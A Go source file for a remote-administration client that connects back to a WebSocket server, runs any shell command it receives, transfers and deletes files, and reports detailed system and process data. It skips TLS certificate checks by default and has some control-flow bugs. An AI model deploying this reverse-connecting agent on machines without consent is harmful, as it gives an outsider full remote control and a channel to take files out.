/*
作者：赵博凯
协议：MIT
*/
// 主程序包
package main

import (
	"archive/zip"
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/net"
	"github.com/shirou/gopsutil/v3/process"
)

const (
	HOST               string = "127.0.0.1"
	PORT               int    = 8765
	INSECURESKIPVERIFY bool   = true
)

type ExecuteCommand struct {
	conn *websocket.Conn
}

// 获取系统信息
func (e *ExecuteCommand) get_systeminfo() map[string]interface{} {
	system_info := make(map[string]interface{})

	// 获取主机信息
	if host_info, err := host.Info(); err != nil {
		system_info["host"] = "error: " + err.Error()
	} else {
		system_info["host"] = host_info
	}

	// 获取CPU信息
	if cpu_info, err := cpu.Info(); err != nil {
		system_info["cpu"] = "error: " + err.Error()
	} else {
		system_info["cpu"] = cpu_info
	}

	// 获取内存信息
	if mem_info, err := mem.VirtualMemory(); err != nil {
		system_info["memory"] = "error: " + err.Error()
	} else {
		system_info["memory"] = mem_info
	}

	// 获取交换内存信息
	if smem_info, err := mem.SwapMemory(); err != nil {
		system_info["swap_memory"] = "error: " + err.Error()
	} else {
		system_info["swap_memory"] = smem_info
	}

	// 获取磁盘分区信息
	if partition_info, err := disk.Partitions(true); err != nil {
		system_info["partition"] = "error: " + err.Error()
	} else {
		system_info["partition"] = partition_info
		// 获取磁盘使用情况
		if len(partition_info) > 0 {
			if usage_info, err := disk.Usage(partition_info[0].Mountpoint); err != nil {
				system_info["disk_usage"] = "error: " + err.Error()
			} else {
				system_info["disk_usage"] = usage_info
			}
		}
	}

	// 获取磁盘IO信息
	if io_info, err := disk.IOCounters(); err != nil {
		system_info["io_disk"] = "error: " + err.Error()
	} else {
		system_info["io_disk"] = io_info
	}

	// 获取网络接口信息
	if interfaces_info, err := net.Interfaces(); err != nil {
		system_info["interfaces"] = "error: " + err.Error()
	} else {
		system_info["interfaces"] = interfaces_info
	}

	// 获取网络IO信息
	if io_net_info, err := net.IOCounters(true); err != nil {
		system_info["io_network"] = "error: " + err.Error()
	} else {
		system_info["io_network"] = io_net_info
	}

	// 获取进程信息
	if processes_info, err := process.Processes(); err != nil {
		system_info["processes"] = "error: " + err.Error()
	} else {
		system_info["processes"] = processes_info
	}

	return system_info
}

// 删除文件
func (e *ExecuteCommand) delete_file(path string) string {
	file_info, err := os.Stat(path)
	if err != nil {
		return err.Error()
	}
	if file_info.IsDir() {
		err := os.RemoveAll(path)
		if err != nil {
			return err.Error()
		}
	} else {
		err := os.Remove(path)
		if err != nil {
			return err.Error()
		}
	}
	return "ok"
}

// 复制文件
func copy_file(old_path, new_path string) error {
	old_file, err := os.Open(old_path)
	if err != nil {
		return err
	}
	defer old_file.Close()
	new_file, err := os.Create(new_path)
	if err != nil {
		return err
	}
	defer new_file.Close()
	_, err = io.Copy(new_file, old_file)
	if err != nil {
		return err
	}
	return nil
}

// 递归复制文件夹
func copy_dir(old_path, new_path string) error {
	old_info, err := os.Stat(old_path)
	if err != nil {
		return err
	}
	err = os.MkdirAll(new_path, old_info.Mode())
	if err != nil {
		return err
	}
	entries, err := os.ReadDir(old_path)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		src_path := filepath.Join(old_path, entry.Name())
		dst_path := filepath.Join(new_path, entry.Name())
		if entry.IsDir() {
			err = copy_dir(src_path, dst_path)
			if err != nil {
				return err
			}
		} else {
			err = copy_file(src_path, dst_path)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// 复制文件或文件夹
func (e *ExecuteCommand) copy_file(old_path, new_path string) string {
	file_info, err := os.Stat(old_path)
	if err != nil {
		return err.Error()
	}
	if file_info.IsDir() {
		err = copy_dir(old_path, new_path)
		if err != nil {
			return err.Error()
		}
	} else {
		err = copy_file(old_path, new_path)
		if err != nil {
			return err.Error()
		}
	}
	return "ok"
}

// 重命名文件或文件夹
func (e *ExecuteCommand) move_file(old_path, new_path string) string {
	err := os.Rename(old_path, new_path)
	if err != nil {
		return err.Error()
	}
	return "ok"
}

// 压缩文件
func compress_file(old_path, new_path string) error {
	old_file, err := os.Open(old_path)
	if err != nil {
		return err
	}
	defer old_file.Close()
	new_file, err := os.Create(new_path)
	if err != nil {
		return err
	}
	defer new_file.Close()
	writer := zip.NewWriter(new_file)
	defer writer.Close()
	file, err := writer.Create(filepath.Base(old_path))
	if err != nil {
		return err
	}
	_, err = io.Copy(file, old_file)
	if err != nil {
		return err
	}
	return nil
}

// 压缩文件夹
func compress_dir(old_path, new_path string) error {
	zip_file, err := os.Create(new_path)
	if err != nil {
		return err
	}
	defer zip_file.Close()

	writer := zip.NewWriter(zip_file)
	defer writer.Close()

	return filepath.Walk(old_path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// 获取相对路径，保持压缩包内的目录结构
		relPath, err := filepath.Rel(old_path, filePath)
		if err != nil {
			return err
		}

		// 创建zip文件头
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// 设置压缩包内的路径
		header.Name = relPath
		if info.IsDir() {
			header.Name += "/"
		}

		// 创建文件写入器
		writer, err := writer.CreateHeader(header)
		if err != nil {
			return err
		}

		// 如果是文件，写入文件内容
		if !info.IsDir() {
			file, err := os.Open(filePath)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}
		}
		return nil
	})
}

// 压缩文件或文件夹
func (e *ExecuteCommand) compress(old_path, new_path string) string {
	file_info, err := os.Stat(old_path)
	if err != nil {
		return err.Error()
	}
	if file_info.IsDir() {
		err = compress_dir(old_path, new_path)
		if err != nil {
			return err.Error()
		}
	} else {
		err = compress_file(old_path, new_path)
		if err != nil {
			return err.Error()
		}
	}
	return "ok"
}

// 解压文件
func extract_file(old_path, new_path string) error {
	if err := os.MkdirAll(new_path, 0755); err != nil {
		return err
	}
	reader, err := zip.OpenReader(old_path)
	if err != nil {
		return err
	}
	defer reader.Close()

	abs_dest_dir, err := filepath.Abs(new_path)
	if err != nil {
		return err
	}

	for _, file := range reader.File {
		new_file_path := filepath.Join(new_path, filepath.Clean(file.Name))
		abs_new_file_path, err := filepath.Abs(new_file_path)
		if !strings.HasPrefix(abs_new_file_path, abs_dest_dir) {
			continue
		}
		if file.FileInfo().IsDir() {
			err = os.MkdirAll(new_file_path, 0755)
			if err != nil {
				return err
			}
		} else {
			new_file, err := os.Create(new_file_path)
			if err != nil {
				return err
			}
			defer new_file.Close()
			old_file, err := file.Open()
			if err != nil {
				return err
			}
			defer old_file.Close()
			_, err = io.Copy(new_file, old_file)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// 解压文件或文件夹
func (e *ExecuteCommand) extract(old_path, new_path string) string {
	err := extract_file(old_path, new_path)
	if err != nil {
		return err.Error()
	}
	return "ok"
}

// 执行命令并返回结果
func (e *ExecuteCommand) execute_command(command string) map[string]interface{} {
	host_info, _ := host.Info()
	var shell, flag string

	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	output, err := cmd.CombinedOutput()
	output_str := string(output)

	if len(output_str) > 600000 {
		output_str = output_str[:600000]
	}

	result_map := make(map[string]interface{})
	result_map["command"] = command
	result_map["output"] = output_str
	if err != nil {
		result_map["error"] = err.Error()
	}
	result_map["status"] = cmd.ProcessState.ExitCode()
	return result_map
}

// 在后台执行命令
func (e *ExecuteCommand) execute_bg_command(command string) {
	host_info, _ := host.Info()
	var shell, flag string

	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	_ = cmd.Start()
}

// 获取当前文件列表
func (e *ExecuteCommand) get_file_list() map[string]interface{} {
	file_json := map[string]interface{}{
		"error":       "",
		"directories": []map[string]interface{}{},
		"files":       []map[string]interface{}{},
	}
	file_list, err := os.ReadDir(".")
	if err != nil {
		file_json["error"] = err.Error()
		return file_json
	}
	for _, file := range file_list {
		file_info, err := file.Info()
		if err != nil {
			file_json["error"] = fmt.Sprintf("%s%s\n", file_json["error"], err.Error())
		}
		file_map := map[string]interface{}{
			"name":      file_info.Name(),
			"mode_time": file_info.ModTime().String(),
			"mode":      file_info.Mode().String(),
			"size":      fmt.Sprintf("%dB", file_info.Size()),
		}
		if file.IsDir() {
			file_json["directories"] = append(file_json["directories"].([]map[string]interface{}), file_map)
		} else {
			file_json["files"] = append(file_json["files"].([]map[string]interface{}), file_map)
		}
	}
	return file_json
}

// 新建目录
func (e *ExecuteCommand) create_directory(directory string) string {
	err := os.Mkdir(directory, 0755)
	if err != nil {
		return err.Error()
	}
	return "ok"
}

// 更改当前工作目录
func (e *ExecuteCommand) change_directory(directory string) string {
	err := os.Chdir(directory)
	if err != nil {
		return err.Error()
	}
	return "ok"
}

// 上传文件
func (e *ExecuteCommand) upload_file(file_path string, contents string) string {
	message := "ok"
	retry := 0
	if contents == "" {
		// Create a new file and close it
		file, err := os.Create(file_path)
		file.Write([]byte(""))
		if err != nil {
			message = err.Error()
		} else {
			file.Close()
		}
	} else {
		// Open or create the file with write permissions
		// 增加重试机制是为了解决Windows上文件被占用的问题，等待占用的锁被释放
	retry_code:
		file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			if retry > 3 {
				message = err.Error()
			}
			time.Sleep(5 * time.Second)
			retry++
			goto retry_code
		} else {
			// Decode base64 encoded content
			decoded_content, err := base64.StdEncoding.DecodeString(contents)
			if err != nil {
				message = err.Error()
			} else if _, err := file.Write(decoded_content); err != nil {
				message = err.Error()
			}
			file.Close()
		}
	}
	return message
}

// 获取系统信息
func get_system_info() string {
	hostInfo, err := host.Info()
	if err != nil {
		return "error"
	}

	cpuInfo, err := cpu.Info()
	if err != nil {
		return "error"
	}

	system := hostInfo.OS
	node := hostInfo.Hostname
	release := hostInfo.PlatformVersion
	version := hostInfo.KernelVersion
	machine := hostInfo.KernelArch
	processor := cpuInfo[0].ModelName

	systemInfo := fmt.Sprintf("%s %s %s %s %s %s",
		system, node, release, version, machine, processor)

	return systemInfo
}

// 客户端主循环
func client_loop() {
	// 注意：此处为了简便，跳过了证书验证，如果在生产环境和不受信任的环境中，请将INSECURESKIPVERIFY参数值改为false
	tls_config := &tls.Config{
		InsecureSkipVerify: INSECURESKIPVERIFY,
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tls_config,
	}

	for {
		conn, _, err := dialer.Dial(
			fmt.Sprintf("wss://%s:%d", HOST, PORT),
			nil,
		)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		system_info := get_system_info()
		if err := conn.WriteMessage(websocket.TextMessage, []byte(system_info)); err != nil {
			conn.Close()
			continue
		}

		Executecommand := &ExecuteCommand{conn: conn}

		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				conn.Close()
				break
			}

			command := string(message)
			if command == "exit" {
				// 退出命令
				conn.Close()
				return
			} else if command == "systeminfo" {
				// 获取系统信息
				system_info := Executecommand.get_systeminfo()
				if err := conn.WriteJSON(system_info); err != nil {
					conn.Close()
					break
				}
			} else if command == "ls" {
				// 列出当前目录下的文件
				file_list := Executecommand.get_file_list()
				if err := conn.WriteJSON(file_list); err != nil {
					conn.Close()
					break
				}
			} else if command == "pwd" {
				// 获取当前工作目录
				current_directory, _ := os.Getwd()
				if err := conn.WriteMessage(websocket.TextMessage, []byte(current_directory)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "delete:") {
				// 删除文件或文件夹
				file_path := command[len("delete:"):]
				message := Executecommand.delete_file(file_path)
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "cp:") {
				// 复制文件或文件夹
				file_info := command[len("cp:"):]
				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
				message := Executecommand.copy_file(file_info_list[0], file_info_list[1])
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
				}
			} else if strings.HasPrefix(command, "mv:") {
				// 重命名文件或文件夹
				file_info := command[len("mv:"):]
				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
				message := Executecommand.move_file(file_info_list[0], file_info_list[1])
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "compress") {
				// 压缩文件或文件夹
				file_info := command[len("compress:"):]
				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
				message := Executecommand.compress(file_info_list[0], file_info_list[1])
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "extract") {
				// 解压文件
				file_info := command[len("extract:"):]
				file_info_list := strings.SplitN(file_info, "(*.*)", 2)
				message := Executecommand.extract(file_info_list[0], file_info_list[1])
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "command:") {
				// 执行命令
				command = command[len("command:"):]
				output := Executecommand.execute_command(command)
				if err := conn.WriteJSON(output); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "background:") {
				// 后台执行命令
				command = command[len("background:"):]
				go Executecommand.execute_bg_command(command)
				if err := conn.WriteMessage(websocket.TextMessage, []byte("ok")); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "mkdir:") {
				// 创建目录
				directory := command[len("mkdir:"):]
				result := Executecommand.create_directory(directory)
				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
					conn.Close()
				}
			} else if strings.HasPrefix(command, "cd:") {
				// 更改目录
				directory := command[len("cd:"):]
				result := Executecommand.change_directory(directory)
				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "upload:") {
				// 上传文件
				upload_file_info := command[len("upload:"):]
				file_parts := strings.SplitN(upload_file_info, "(*.*)", 2)
				message := Executecommand.upload_file(file_parts[0], file_parts[1])
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "download:") {
				// 下载文件
				message := "finish:zhaobokai"
				file_path := command[len("download:"):]
				file, err := os.Open(file_path)
				if err != nil {
					message = err.Error()
				}
				bufio.NewReader(file)
				buffer := make([]byte, 4096)
				for {
					n, err := file.Read(buffer)
					if err != nil {
						if err != io.EOF {
							message = "error:zhaobokai" + err.Error()
						}
						break
					}
					encode_content := base64.StdEncoding.EncodeToString(buffer[:n])
					if err := conn.WriteMessage(websocket.TextMessage, []byte(encode_content)); err != nil {
						conn.Close()
						break
					}
				}
				file.Close()
				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
					conn.Close()
					break
				}
			} else {
				// 未知命令
				if err := conn.WriteMessage(websocket.TextMessage, []byte("Unknown command")); err != nil {
					conn.Close()
				}
			}
		}
	}
}

// 主函数
func main() {
	client_loop()
}
